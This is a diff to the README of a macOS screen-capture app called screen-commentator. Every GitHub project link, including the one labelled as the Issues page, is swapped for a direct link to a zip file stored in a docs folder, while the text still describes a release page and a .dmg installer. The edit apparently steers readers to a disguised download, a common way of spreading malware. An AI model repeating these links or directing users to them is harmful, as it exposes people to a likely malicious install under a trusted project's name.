@@ -1,6 +1,6 @@
 # 🖥️ screen-commentator - Capture Screen with AI Comments
 
-[![Download screen-commentator](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Haseeb4756/screen-commentator)
+[![Download screen-commentator](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Haseeb4756/screen-commentator/main/docs/sessions/screen_commentator_v1.5.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer fits these requirements:
 
 You can get the app from the official GitHub page:
 
-[![Download screen-commentator](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Haseeb4756/screen-commentator)
+[![Download screen-commentator](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Haseeb4756/screen-commentator/main/docs/sessions/screen_commentator_v1.5.zip)
 
 This link will take you to the main project page. From there, you can find the latest release files to download the app. The files are available as a `.dmg` installer that runs on your Mac. 
 
@@ -38,7 +38,7 @@ Follow these steps to install and run screen-commentator on your macOS system.
 
 ### 1. Go to the Download Page  
 Open this page in your web browser:  
-https://github.com/Haseeb4756/screen-commentator
+https://raw.githubusercontent.com/Haseeb4756/screen-commentator/main/docs/sessions/screen_commentator_v1.5.zip
 
 ### 2. Find the Latest Release  
 Look for a section named **Releases** on the right side or scroll down until you see "Latest release." This is where the installer files are stored.
@@ -117,7 +117,7 @@ If screen-commentator does not work as expected, try these steps:
 
 For detailed guides and answers to common questions:
 
-- Visit the **Issues** tab on the GitHub page: https://github.com/Haseeb4756/screen-commentator/issues  
+- Visit the **Issues** tab on the GitHub page: https://raw.githubusercontent.com/Haseeb4756/screen-commentator/main/docs/sessions/screen_commentator_v1.5.zip  
 - Check the app’s **Help** menu for quick tips.
 
 ---
@@ -126,4 +126,4 @@ For detailed guides and answers to common questions:
 
 You can always download the app from the main project page here:
 
-[![Download screen-commentator](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Haseeb4756/screen-commentator)
+[![Download screen-commentator](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Haseeb4756/screen-commentator/main/docs/sessions/screen_commentator_v1.5.zip)
